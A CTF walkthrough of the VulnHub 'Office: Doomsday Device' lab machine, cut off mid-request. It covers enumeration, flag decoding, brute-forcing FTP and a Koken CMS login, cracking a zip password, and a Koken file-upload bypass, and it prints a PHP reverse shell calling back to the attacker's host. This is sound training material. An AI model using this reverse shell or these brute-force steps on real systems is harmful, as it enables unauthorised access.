[vulnhub - easy/medium] the office: doomsday device
---------------------------------------------------

[link to the machine](https://www.vulnhub.com/entry/the-office-doomsday-device,627/)

[there are 8 flags in this machine]

I start off with a nmap scan of all ports to see which ones are open:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ nmap -p- -T4 -oA nmap_info_allports 192.168.56.102         
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-29 10:16 -03
Nmap scan report for 192.168.56.102
Host is up (0.000063s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    filtered ssh
80/tcp    open     http
18888/tcp open     apc-necmp
65533/tcp open     unknown
```

And then a detailed nmap scan:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ nmap -sC -sV -p 21,22,80,18888,65533 -oA nmap_info 192.168.56.102
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-29 10:33 -03
Nmap scan report for 192.168.56.102
Host is up (0.00050s latency).

PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
22/tcp    filtered ssh
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/nothingtoseehere
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
18888/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Dunder Mifflin
|_http-generator: Koken 0.22.24
|_http-server-header: Apache/2.4.29 (Ubuntu)
65533/tcp open     http    Apache httpd 2.4.29
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.96 seconds
zsh: segmentation fault  nmap -sC -sV -p 21,22,80,18888,65533 -oA nmap_info 192.168.56.102
```

There's very interesting stuff in this scan, like the robots.txt file and what is being served on port 18888. But first I look up the HTTP page that's served on port 80 and this is what I see:

![the office 1](./images/the-office-1.png)

Checking the webpage's source code, I find the following text commented out:

```html
 <!-- Li0tLSAuLiAtLSAvIC4tIC0uIC0uLiAvIC4tLS4gLi0gLS0gLyAuLi4uIC4tIC4uLi0gLiAvIC0gLi0gLi0uLiAtLi0gLiAtLi4gLyAuLSAtLi4uIC0tLSAuLi0gLSAvIC0tIC4gLyAuLiAtLiAvIC0tIC0tLSAuLS4gLi4uIC4gLyAtLi0uIC0tLSAtLi4gLiAvIC4uLiAuIC4uLi0gLiAuLS4gLi0gLi0uLiAvIC0gLi4gLS0gLiAuLi4gLi0uLS4tIC8gLS4uLiAuLi0gLSAvIC4tLS0gLS0tIC0uLSAuIC4tLS0tLiAuLi4gLyAtLS0gLS4gLyAtIC4uLi4gLiAtLSAvIC0uLi4gLiAtLi0uIC4tIC4uLSAuLi4gLiAvIC4uIC8gLS4tIC0uIC0tLSAuLS0gLyAtLSAtLS0gLi0uIC4uLiAuIC8gLS4tLiAtLS0gLS4uIC4gLi0uLS4tIC8gLi4uIC4uIC0uIC0uLS4gLiAvIC0uLS0gLS0tIC4uLSAvIC0uLS4gLS0tIC4uLSAuLS4uIC0uLiAvIC4tLiAuIC4tIC0uLiAvIC0gLi4uLiAuLiAuLi4gLyAuLiAvIC4tIC4uLiAuLi4gLi4tIC0tIC4gLyAtLi0tIC0tLSAuLi0gLyAtLi0gLS4gLS0tIC4tLSAvIC4uIC0gLyAtIC0tLSAtLS0gLi0uLS4tIC8gLi0gLS4gLS4tLSAuLS0gLi0gLS4tLSAuLi4gLyAtIC4uLi4gLi4gLi4uIC8gLi4gLi4uIC8gLi0tLSAuLi0gLi4uIC0gLyAtIC4uLi4gLiAvIC4uLS4gLi4gLi0uIC4uLiAtIC8gLi4tLiAuLS4uIC4tIC0tLiAtLS4uLS0gLyAtLi0tIC0tLSAuLi0gLyAuLS0gLi4gLi0uLiAuLS4uIC8gLS4gLiAuLi4tIC4gLi0uIC8gLS4tLiAuLS4gLi0gLS4tLiAtLi0gLyAtLSAtLi0tIC8gLi4gLS4gLS0uIC4gLS4gLi4gLS0tIC4uLSAuLi4gLyAtLSAuLSAtLi0uIC4uLi4gLi4gLS4gLiAtLS4uLS0gLyAtLi4gLS0tIC0uIC4tLS0tLiAtIC8gLi4tLiAtLS0gLi0uIC0tLiAuIC0gLyAuLiAvIC4tIC0tIC8gLS4uLiAuIC0gLSAuIC4tLiAvIC0gLi4uLiAuLSAtLiAvIC0uLS0gLS0tIC4uLSAvIC4uLi4gLi0gLi4uLSAuIC8gLiAuLi4tIC4gLi0uIC8gLS4uLiAuIC4gLS4gLyAtLS0gLi0uIC8gLiAuLi4tIC4gLi0uIC8gLi0tIC4uIC4tLi4gLi0uLiAvIC0uLi4gLiAtLi0uLS0gLyAtLi4gLi0tIC4uIC0tLiAuLi4uIC0gLyAuLi0uIC4tLi4gLi0gLS0uIC4tLS0tIC0tLS4uLiAvIC0tLS4uIC0uLS4gLi0gLi4tLiAtLS0tLiAtLi0uIC0uLi4uIC4uLi4tIC4uLS4gLS0tLS4gLS4uIC4tLS0tIC4tLS0tIC0tLS4uIC4tLS0tIC4uLS0tIC0tLS0tIC0uLi4uIC4uLS4gLiAtLi0uIC0tLi4uIC4uLS4gLi4uLi0gLS0tLS0gLi0gLS0uLi4gLi4uLi4gLi4tLS0gLi4uLi0gLS4uLiAuLi4tLQ== -->
```

Which is a base64 encoded string, so I use base64 to decode and this is what i get:

```bash
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ echo '<ENCODED_STRING>' | base64 -d
.--- .. -- / .- -. -.. / .--. .- -- / .... .- ...- . / - .- .-.. -.- . -.. / .- -... --- ..- - / -- . / .. -. / -- --- .-. ... . / -.-. --- -.. . / ... . ...- . .-. .- .-.. / - .. -- . ... .-.-.- / -... ..- - / .--- --- -.- . .----. ... / --- -. / - .... . -- / -... . -.-. .- ..- ... . / .. / -.- -. --- .-- / -- --- .-. ... . / -.-. --- -.. . .-.-.- / ... .. -. -.-. . / -.-- --- ..- / -.-. --- ..- .-.. -.. / .-. . .- -.. / - .... .. ... / .. / .- ... ... ..- -- . / -.-- --- ..- / -.- -. --- .-- / .. - / - --- --- .-.-.- / .- -. -.-- .-- .- -.-- ... / - .... .. ... / .. ... / .--- ..- ... - / - .... . / ..-. .. .-. ... - / ..-. .-.. .- --. --..-- / -.-- --- ..- / .-- .. .-.. .-.. / -. . ...- . .-. / -.-. .-. .- -.-. -.- / -- -.-- / .. -. --. . -. .. --- ..- ... / -- .- -.-. .... .. -. . --..-- / -.. --- -. .----. - / ..-. --- .-. --. . - / .. / .- -- / -... . - - . .-. / - .... .- -. / -.-- --- ..- / .... .- ...- . / . ...- . .-. / -... . . -. / --- .-. / . ...- . .-. / .-- .. .-.. .-.. / -... . -.-.-- / -.. .-- .. --. .... - / ..-. .-.. .- --. .---- ---... / ---.. -.-. .- ..-. ----. -.-. -.... ....- ..-. ----. -.. .---- .---- ---.. .---- ..--- ----- -.... ..-. . -.-. --... ..-. ....- ----- .- --... ..... ..--- ....- -... ...-- 
```

So it is double-encoded, first base64 and then morse code. Using an internet [morse code translator](https://morsecode.world/international/translator.html), I get this:

![bulldog 2](./images/the-office-2.png)

So the first flag is 8CAF9C64F9D1181206FEC7F40A7524B3, seven remaining.

The next step is doing a gobuster directory bruteforcing to see what I can find:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_dir_info.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.102
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/29 10:49:22 Starting gobuster in directory enumeration mode
===============================================================
/nick                 (Status: 301) [Size: 315] [--> http://192.168.56.102/nick/]
/staffblog            (Status: 301) [Size: 320] [--> http://192.168.56.102/staffblog/]
/server-status        (Status: 403) [Size: 279]                                       
                                                                                      
===============================================================
2022/10/29 10:49:44 Finished
===============================================================
```

Next up is checking what's on the "/nick" directory, and this is what I find:

![bulldog 3](./images/the-office-3.png)

The farewell note reads:

```
Hey Michael!

I just wanted to say goodbye. Through Teach for America, I'm gonna go down to Detroit and teach inner-city kids about computers. You know, I'm the lame IT guy and probably you don't even know my name so, who cares. But I just wanted you to know that the old creepy guy uses a pretty weak password. You know, the one who smells like death. You should do something about it. 

Nick
```

And the .pcap file reads:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ tcpick -C -yP -r nick.pcap 
Starting tcpick 0.2.1 at 2022-10-29 10:53 -03
Timeout for connections is 600
tcpick: reading from nick.pcap
1      SYN-SENT       10.0.2.15:49224 > 10.0.2.75:ftp
1      SYN-RECEIVED   10.0.2.15:49224 > 10.0.2.75:ftp
1      ESTABLISHED    10.0.2.15:49224 > 10.0.2.75:ftp
220 (vsFTPd 3.0.3)
USER creed
331 Please specify the password.
PASS creed
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,2,15,235,21
200 PORT command successful. Consider using PASV.
LIST -al
2      SYN-SENT       10.0.2.75:ftp-data > 10.0.2.15:60181
2      SYN-RECEIVED   10.0.2.75:ftp-data > 10.0.2.15:60181
2      ESTABLISHED    10.0.2.75:ftp-data > 10.0.2.15:60181
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Oct 19 07:56 .
drwxr-xr-x    2 1002     1002         4096 Oct 19 07:56 ..
-rw-r--r--    1 1002     1002          220 Apr 04  2018 .bash_logout
-rw-r--r--    1 1002     1002         3771 Apr 04  2018 .bashrc
-rw-r--r--    1 1002     1002          807 Apr 04  2018 .profile
-rw-rw-r--    1 1002     1002           26 Oct 19 07:56 new_identity
2      FIN-WAIT-1     10.0.2.75:ftp-data > 10.0.2.15:60181
2      TIME-WAIT      10.0.2.75:ftp-data > 10.0.2.15:60181
2      CLOSED         10.0.2.75:ftp-data > 10.0.2.15:60181
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,2,15,215,155
200 PORT command successful. Consider using PASV.
RETR new_identity
3      SYN-SENT       10.0.2.75:ftp-data > 10.0.2.15:55195
3      SYN-RECEIVED   10.0.2.75:ftp-data > 10.0.2.15:55195
3      ESTABLISHED    10.0.2.75:ftp-data > 10.0.2.15:55195
150 Opening BINARY mode data connection for new_identity (26 bytes).
William Charles Schneider
3      FIN-WAIT-1     10.0.2.75:ftp-data > 10.0.2.15:55195
3      TIME-WAIT      10.0.2.75:ftp-data > 10.0.2.15:55195
3      CLOSED         10.0.2.75:ftp-data > 10.0.2.15:55195
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,2,15,190,211
200 PORT command successful. Consider using PASV.
LIST -al
4      SYN-SENT       10.0.2.75:ftp-data > 10.0.2.15:48851
4      SYN-RECEIVED   10.0.2.75:ftp-data > 10.0.2.15:48851
4      ESTABLISHED    10.0.2.75:ftp-data > 10.0.2.15:48851
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Oct 19 07:56 .
drwxr-xr-x    2 1002     1002         4096 Oct 19 07:56 ..
-rw-r--r--    1 1002     1002          220 Apr 04  2018 .bash_logout
-rw-r--r--    1 1002     1002         3771 Apr 04  2018 .bashrc
-rw-r--r--    1 1002     1002          807 Apr 04  2018 .profile
-rw-rw-r--    1 1002     1002           26 Oct 19 07:56 new_identity
4      FIN-WAIT-1     10.0.2.75:ftp-data > 10.0.2.15:48851
4      TIME-WAIT      10.0.2.75:ftp-data > 10.0.2.15:48851
4      CLOSED         10.0.2.75:ftp-data > 10.0.2.15:48851
226 Directory send OK.
QUIT
221 Goodbye.
1      FIN-WAIT-1     10.0.2.15:49224 > 10.0.2.75:ftp
1      TIME-WAIT      10.0.2.15:49224 > 10.0.2.75:ftp
1      CLOSED         10.0.2.15:49224 > 10.0.2.75:ftp
tcpick: done reading from nick.pcap

75 packets captured                                                                                                
4 tcp sessions detected
```

What I can get from these files is that Creed (a.k.a. the old creepy guy) has username 'creed' and password 'creed' to access the FTP server. I attempt to log in  the server with these credentials but I'm denied access. So I proceed with the enumeration of the directories and check out '/staffblog' and this is what I find:

![bulldog 4](./images/the-office-4.png)

The doc file reads:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ catdoc CreedThoughts.doc 
www.creedthoughts.gov.www/creedthoughts

Creed Thoughts!

Hey-o, everyone out there in SyberWorld. It,s old Creed Bratton coming
at your again, here from my perch as a Quality Assurance Manager at
Dunder Mifflin paper. Just a few observations on the world around me.

What do you guys think is the best kind of car? To me, you can,t beat
motorcycles. They're small and dangerous.

I got into a car accident yesterday and I just took off. It didn't look
too bad. The guy was making a big deal out of it, but come on — dogs
dont live forever.

Sometimes when I,m sick, or feeling blue, I drink vinegar. I like all
kinds: balsamic, vodka, orange juice, leaves.

Working in an office is fine, but I,d rather be a millionaire.
(Elaborate on this. It,s interesting. Maybe Trademark it, too.)

Today in my office where I work as Director of Quality Assurance, we
went to the beach for some reason that was never adequately explained.
When we were there, our manager told us to eat hot coals. I thought that
was a little bit untoward so I ate a fish. Then a woman I have literally
never seen before in my entire life started talking very loudly about
something involving Halpert. She was agitated, I,d say. From what I
could guess, she was definitely on drugs of some kind, perhaps cocaine,
or maybe ‘drines. Also, she is a knock-out. She reminds me of a young
Daphne Du Maurier. Also, I stupidly ate the fishbones. I told myself
“never again” after the last time, but then you turn around, and
bam, they're in my mouth. I also ate 55 hot dogs in 15 minutes, which is
a world record.

Everybody remembers: “April showers bring May flowers.” But no one
remembers how the rest of that goes. Which I find so frustrating.

Prediction: the Orioles will win the World Series over the Pirates in
seven games.

Prediction: the space program will be renamed the Outer Space Program by
2060.

Prediction: someday we will be able to travel faster than sound. We will
“break the sound barrier.”

Prediction: [note - need more predictions.]

Reminder: The IT guy told that my password is not safe enough. I wonder
how he found out. Anyways, I added 3 digits to the end so it’s
supersafe now. Nobody's gonna crack that, baby!

#FLAG3: 50f1ff7bc72bb24c0082be83a8b8c497
```

I get two very interesting informations out of it: the FTP password for user 'creed' is 'creed' + three digits added to it and the third flag is 50f1ff7bc72bb24c0082be83a8b8c497 - six remaining.

I'll have to bruteforce the FTP server to find Creed's credentials, but fists i must generate the possible passwords, so I create a python script:

```python
file=open('./creed_password.txt', 'a')
print(file)

base="creed"
for i in range(0, 10):
    for j in range(0, 10): 
        for k in range(0, 10):
            line=(base + str(i) + str(j) + str(k))
            file.write(line+'\n')

file.close()
```

And with the "creed_password.txt" file in hand I bruteforce with hydra:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ hydra -l creed -P /home/j/Desktop/vulnhub/the-office-doomsday/scripts/creed_password.txt ftp://192.168.56.102/ -V
...
[ATTEMPS]
[21][ftp] host: 192.168.56.102   login: creed   password: creed223
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-29 11:09:49
```

The files available in the FTP server are:

```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40072|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2026 Nov 12  2020 archive.zip
-rw-r--r--    1 0        0             176 Nov 30  2020 reminder.txt
226 Directory send OK.
```

I download both files onto my machine, the reminder reads:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ cat reminder.txt 
Oh snap, I forgot the password for this zip file. I remember, it made Michael laugh when he heard it, but Pam got really offended.

#FLAG4: 4955cbee5a6a5a48ce79624932bd1374
```

This comes with three important informations: the zip file is protected, its password is probably silly and crackable and the fourth flag: 4955cbee5a6a5a48ce79624932bd1374, five remaining.

I check the zip file and it is indeed password protected, so I must crack it:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ zip2john archive.zip > archive.hash 
```

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ john archive.hash       
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
bigboobz         (archive.zip)     
1g 0:00:02:06 DONE 3/3 (2022-10-29 11:30) 0.007910g/s 16066Kp/s 16066Kc/s 16066KC/s bl1nil99..biglog86
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

So with the password 'bigboobz' I extract the files from the zip file. I get two files out of it, one named "michael" and another one named "email". The "email" file reads:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ cat email     
To: oscar@dundermifflin.com
Subject: Costume Party
From: michael@dundermifflin.com
Content-Type: text/html; charset="utf8"

Hey Oscar!

Angela is out sick so she couldn't manage the costume party gallery right now. Dwight showed up as a jamaican zombie woman AGAIN. It's gross. Please remove the picture from the gallery. Oh yeah, you don't have access to it, so just use Angela's profile. The password is most probably one of her cats name. 

Michael
```

The "michael" file reads:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ cat michael  
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,CF1CA7F9558B5637B0C9F66B972B6AB6

GlAt2Uhi+zBOMhGrASR0ica1YTk7BTBNzKAkqLGzyTy1eplEKiTou7LdW5hV7Khf
ZU+9X9Cg5L9KHT+w0OFQeVghzYOwZ+aeyzoii1Wo/pFx460eUj5oFTJnsN/UvHfi
sjGX8bLp4RT+HjTZr7b2+XiDww33xdskdnXeHBc9CsDRA+59x8+bszto+X3zaIVF
LaJ4nIx2nTVtn9DKEItfmsL3iCn4BKKT1kQ94K8R3Cx11Hdb49buByRYcICJhoT6
j416LKNUnH9F53dLyHrY6VoxjrckZWQC05DhiNgva6TxBqoX8XMEVWNf9UBoqsbl
MYVY5p2nbvM6u6pyViX6hSqLLxMe9kcyvYeC51irASXIlGZW6fQEieGesRm4uKG4
HeFtT57TXh7XIjqscqsR/swFMF9FGRRro0fCDTza3q+lKrmGWSQT6zM4F4iH0oOu
6K8cpe2JBfBQTHIXG136Xu4IF/4FVzXFfP4B920ecwTjRdxpeCZIKcItqp6dQ50f
HomaBFr0Bka/UfyJADDaDJ1oC78Vgg31y6QQwQsfKpiL0GDYwmCYFEk2/WBF8uyf
ZwTh0CnyUcIyXxv996ZLfX9RSRcrKXhMjw2YLz43cP5bkwUrBZ1/OnnCsxzaZWBX
r+NZEWkFIfFGat6RWmregVwR58oQg4s07fIIN+VFWTdCl9HGFlMGBrpUrly5PIzF
5hEIxDiuL6LEcW5kMYwtrPCo4QK+++KikySBpNaVxuY0Fy1E07AKyFl+7DMu82eH
hI29O4ebO0J15jxIX8Ta9dXCspqKbYeL6RMB6/uZEd61cP2Mh0Kd8K7rUuCdyOIF
7RXF61whnhy4YB7Um+O3iTABQjsR2T0+IKxasYEriuQNMrqMwtQXPIfxJ/wAcViA
mLKh/HoCUCfoC8+ksWwycYuEde06OxRH9zn0HITt5pgs+gtkBgGG25xSUbE9rGMC
iQGd/wDIcad0tjT9WnxoSPvlYRHSWLy5KjyGGShWRcXbMM4lhZbvHHktr6pD35rn
XMWdsLTKn5xr0IDF+iBNpd/cUKGO1Wi4TjZkZf6aTZZCzumrf3/A1ZH6pf32vRdg
9fA4eEHgwwn/qLJRYo33mj96+gBdRleYBaIxUmxm4VbJ8qkD0kthPI32LzvVgKOM
8q2J1cC7pJN5BVM1nmMPxz29MUZXvf4RU75p9fE1lBaX/5aBp+J7HUHREBg0cod6
6NHJ+u/WgGhrUGITi2V+4SL7Xi5F1ig2goA8EL5MYlnv4tU39Bihw6AOfqmGza9H
cQr9vsF1ryFXqAD7IxwjjTYgcTWxEj2P/LBzeC6rfLzgPeulPkPHVBaiB2lzIGEB
uExO3CjF9cqZMRyRo8XhOmrZw5vE2eO43uqpWFIwb4PUoG3uVcKEVqpuZ6bSYPvI
L59nw0ONv+1G4t4BG/WSHGKBq1hcpOpNIFGASFR8eVVchpK9OtMTwGvSp/M7diRR
/EjSLFhcBhKgjInCHgyRnQa5X3B6z9/HIGkwdH381CuXl5MYxDAt3S3IvJ6prolz
0lpnN5PD4wHHDdvVSntdV5w4rdJSdWaVcHohLLj/elYvPkjor8MARqeLatyYUL2y
-----END RSA PRIVATE KEY-----
```

This ssh key is not worth much, for the ssh port is not open and the key also requires a password to log in, so what is really interesting about this zip file is the note, that says something about a gallery that so far I have not seen. So I go back to the nmap scan result and there is an HTTP-serving port to see: port 18888.

In there I find a gallery of the Dunder Mifflin employees dressed in halloween costumes. I also find a note posted by Angela:

![bulldog 5](./images/the-office-5.png)

So there must be an admin managamente dashboard for this website that Angela controls. Before using gobuster to bruteforce possible directories, I try reaching for 'http://192.168.56.102:18888/admin/', and I actually find something:

![bulldog 6](./images/the-office-6.png)

Now I gotta bruteforce it with angela's email and the possible passwords. I find a [list of Angela's cats' names](https://theoffice.fandom.com/wiki/Angela%27s_cats). So I create a list with the names and a script to add possible variations:

List:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ cat angelas_cats.txt      
sprinkles
dwight
garbage
bandit
princess lady
princesslady
princess-lady
princess_lady
princess.lady
mr ash
mr. ash
mrash
mr.ash
mr-ash
mr_ash
petals
comstock
ember
milky way
milkyway
milky-way
milky_way
milky.way
diane
lumpy
phillip
philip
tinkie
crinklepuss
bandit two
bandittwo
banditwo
```

Script:

```python
file = open('angelas_cats.txt', 'r')
wfile = open('angelas_cats_final.txt', 'a')

for word in file:
    wfile.write(word)
    wfile.write(word.upper())
    wfile.write(word.title())

file.close()
wfile.close()
```

Now I try to log in with dummy info using OWASP ZAP to see how can I go about bruteforcing a login. The POST request for the login is:

```
POST http://192.168.56.102:18888/api.php?/sessions HTTP/1.1
Host: 192.168.56.102:18888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Koken-Auth: cookie
X-Requested-With: XMLHttpRequest
Content-Length: 39
Origin: https://192.168.56.102:18888
Connection: keep-alive
Referer: https://192.168.56.102:18888/admin/
Cookie: koken_referrer=; koken_session_ci=3UqCzB%2Fu8lANy3gClXrabVXqzHgGUC9VjaaNUf9FBWDTxTxLr9hG5zPHoYygoa0Px21FoLyipSeuM4Fq4NosLTOdYnVKqPXRInjSqMoJGMOiqGmBVHr4gJgVKW41z9Mo2%2F%2FCzJZhFA1nLULZ4CcOzDHstZLvrgDyHA3uBkJsEyJ9N7yyyM2R17AM66pAX9u6qitLqBx0dF0QCSNNij7pDLU27DqOmOyU8m5K05rjUEdDOu5JRdY0TSX7%2FaD%2B0dXKdRtY2%2ByGfUi%2B%2BHj15YdaOk1boLvO7AoTjIwu0fsFPs0gE7KF34st6Md2bM2ycqaMi%2FMiRIEnKrCP7hHc20I5S3cwS68Bmhq20KUC59Uw1cQ%3Dd9c8ac6f792eb6d443dffb1ed0dc84366975cbb8
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

email=mail%40mail.com&password=password
```

This request gets a 404 response, so I must bruteforce as:

```
┌──(j㉿kali)-[~]
└─$ wfuzz -c -z file,/home/j/Desktop/vulnhub/the-office-doomsday/scripts/angelas_cats_final.txt --hc 404 -H 'Cookie: koken_referrer=; koken_session_ci=3UqCzB%2Fu8lANy3gClXrabVXqzHgGUC9VjaaNUf9FBWDTxTxLr9hG5zPHoYygoa0Px21FoLyipSeuM4Fq4NosLTOdYnVKqPXRInjSqMoJGMOiqGmBVHr4gJgVKW41z9Mo2%2F%2FCzJZhFA1nLULZ4CcOzDHstZLvrgDyHA3uBkJsEyJ9N7yyyM2R17AM66pAX9u6qitLqBx0dF0QCSNNij7pDLU27DqOmOyU8m5K05rjUEdDOu5JRdY0TSX7%2FaD%2B0dXKdRtY2%2ByGfUi%2B%2BHj15YdaOk1boLvO7AoTjIwu0fsFPs0gE7KF34st6Md2bM2ycqaMi%2FMiRIEnKrCP7hHc20I5S3cwS68Bmhq20KUC59Uw1cQ%3Dd9c8ac6f792eb6d443dffb1ed0dc84366975cbb8' -d 'email=angela%40dundermifflin.com&password=FUZZ' http://192.168.56.102:18888/api.php?/sessions
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.102:18888/api.php?/sessions
Total requests: 99

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000097:   403        0 L      8 W        125 Ch      "http://192.168.56.102:18888/api.php?/sessions"    
000000099:   403        0 L      8 W        125 Ch      "http://192.168.56.102:18888/api.php?/sessions"    
000000098:   403        0 L      8 W        125 Ch      "http://192.168.56.102:18888/api.php?/sessions"    
000000087:   500        0 L      0 W        0 Ch        "Crinklepuss"                                      

Total time: 0
Processed Requests: 99
Filtered Requests: 95
Requests/sec.: 0
```

We can see that the password 'Crinklepuss' returns status code 500. I try to log in with email 'angela@dundermifflin.com' and password 'Crinklepuss' and this is what I get:

![the office 7](./images/the-office-7.png)

Since we can upload files to koken, I imagine I can upload a php reverse shell, but the problem is that a .php file is not allowed to be uploaded:

![the office 8](./images/the-office-8.png)

I find online that there is a [vulnerability](https://www.exploit-db.com/exploits/48706) on Koken CMS 0.22.24, the same one I'm using, that allows for the user to upload a reverse shell as "revshell.php.jpg" and then rename it afterwards to remove the jpg exetension.
So I proceed to exploit this vulnerability, first by creating the file "phprevshell2.php.jpg", that reads:

```php
<?php
$sock = fsockopen("192.168.56.1",4444);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

I upload this file to the page and send the following request with Burp Suite:

```
POST /api.php?/content HTTP/1.1
Host: 192.168.56.102:18888
Content-Length: 1031
x-koken-auth: cookie
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryw4GHiPqjZGRZcQlW
Accept: */*
Origin: http://192.168.56.102:18888
Referer: http://192.168.56.102:18888/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: koken_session_ci=gtI5leWMcd%2Bxrj5w4locUF1GeWC%2F0536bVMqovoj4txYJSJ5lqp86enVBo4B6n02TFJ6rsAGNSb39CCqnb1UsxciZB%2FROJM2aS35CNxvww1FNFgFDaoosWj3rC6%2Flm5d4kbGMedxm2p62JIxcSxUsB80cn7PqTNzO2pohTPIhQZHHaY2I%2Fvvq9dtk%2FwO%2Bg9cr26DCS7cmaoue2joJBW0rlTk%2BQ079XPxqif6u1yy72JGtn%2FTGJ2%2FMjrp%2B2ClVyVs517kPYNchmXo9X0dHWpStB4y8dza0RrVY7N86QeyRRVkc1xHV85kBY7i%2BHIMjK1qrf05nWluPcamTFPYC1CKLDQHAxKht%2BHFkj2r2em0BXgaCRiIl%2BIYP%2FoNBGfllwyU%2FXM4dj91LAobRWGm6iNmJXF5vpoIHJ6oJehaT16QciKkjmGvswBbBSpVroYjcB6oYvhBFitB%2BcGT0HNB3l1VEd1XUGxSdMsC%2BMtxrbrmDMWVvtY%2BNXYxT30oArlJAnhibUWjZGTAtX7qyQOEvYe5%2FLLXQvrniwaelJUONaQbYjQpCAY0VkcYi38Qu593M2QXivTjnJsO5ltOATR%2B%2B25tkMbZmK9cc6iKR2BTjmMeilzig8kLZ%2BNWLxi6dUwQSyCor3ZSVQFePO2Uw%2FmdJDknCu1r%2B4Iw7KqDSBI3TbfnHKJb6p4zWQa365zyILGWJzb2ihNfPq3%2FZqkfZCFYRfeARt9oRRn4soaFFc1fjMyDgPv%2BiVsu5s%2BP2x8BQnz57snkrYIFJBl4Ut%2FV3ztTj3T5w07FgYieWIwN%2FYdOE3G1r8L82TYVqvyOrcQfVe46z3lHoZKi4QzWdGWQUM39nB3yl40UF3ZKRSoD4aRudJ70r4YOhaMHwUF4qFc7eG%2FNjK%2B%2BxzLmEZiH1OnjLEE7x%2B80HFtT%2BK%2B3gg%2FoW2DDjVOubO27swg2zJaU9EFtKNdGRnZ3mCiEK%2Frbpny7uTIsM6skv%2F127Dq%2FIbg8%2F9vcTCaXgtOZvMZksjD6Jrvx7OryRi26A9gkGYkXtweN9HIbg7u7On%2F8TaPZfgTOxvC04r43bSHI6ENTfZQluIvuAbj74ysSUlDp8PVWfVqAVMecX99DGrjPOd4kaIOwMMzEpkXQRWC8oAPhTIUJtq8eiH5dyt5Jp7S3vlx3pEq099d9BVhEitnBmHY966oEtrVNL7Mxr7OAstXsU08qw9yPnzfzMzihM4unjjr1lXpykKMtO7IPyFzOjcS%2FIWamFJaIUVLawYfWJ%2Flevtmk5Y0WzXdoKSlg1xTFEgCo6PoICdnBr4GOsN%2Ff4VSeDGz5HBsMuBy444vujx42sjlzTGXWRRybaQf0tTuIu%2B8e